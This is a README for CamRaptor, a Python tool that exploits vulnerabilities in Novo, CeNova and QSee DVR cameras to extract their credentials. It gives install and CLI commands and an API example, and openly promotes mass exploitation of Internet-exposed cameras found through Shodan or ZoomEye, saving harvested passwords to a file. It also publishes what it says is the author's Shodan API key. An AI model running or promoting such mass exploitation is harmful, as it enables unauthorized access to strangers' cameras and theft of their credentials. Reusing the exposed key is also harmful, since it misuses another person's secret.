# CamRaptor

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/CamRaptor">
        <img src="https://img.shields.io/badge/language-Python-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/CamRaptor/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/CamRaptor?color=yellow">
    </a>
</p>

CamRaptor is a tool that exploits several vulnerabilities in popular DVR cameras to obtain network camera credentials.

## Features

* Exploits vulnerabilities in most popular camera models such as `Novo`, `CeNova` and `QSee`.
* Optimized to exploit multiple cameras at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/CamRaptor
```

## Basic usage

To use CamRaptor just type `camraptor` in your terminal.

```
usage: camraptor [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS]
                 [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]

CamRaptor is a tool that exploits several vulnerabilities in popular DVR
cameras to obtain network camera credentials.

optional arguments:
  -h, --help            show this help message and exit
  -t, --threads         Use threads for fastest work.
  -o OUTPUT, --output OUTPUT
                        Output result to file.
  -i INPUT, --input INPUT
                        Input file of addresses.
  -a ADDRESS, --address ADDRESS
                        Single address.
  --shodan SHODAN       Shodan API key for exploiting devices over Internet.
  --zoomeye ZOOMEYE     ZoomEye API key for exploiting devices over Internet.
  -p PAGES, --pages PAGES
                        Number of pages you want to get from ZoomEye.
```

### Examples

**Exploiting single camera**

Let's hack my camera just for fun.

```shell
camraptor -a 192.168.99.100
```

**Exploiting cameras from Internet**

Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.

```shell
camraptor -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD
```

**NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)

**Exploiting cameras from input file**

Let's try to use opened database of cameras with `-t` for fast exploitation.

```shell
camraptor -t -i cameras.txt -o passwords.txt
```

**NOTE:** It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

## API usage

CamRaptor also has their own Python API that can be invoked by importing CamRaptor to your code.

```python
from camraptor import CamRaptor
```

### Basic functions

There are all CamRaptor basic functions that can be used to exploit specified camera.

* `exploit(address)` - Exploit single camera by given address.

### Examples

**Exploiting single camera**

```python
from camraptor import CamRaptor

camraptor = CamRaptor()
creds = camraptor.exploit('192.168.99.100')

print(creds)
```
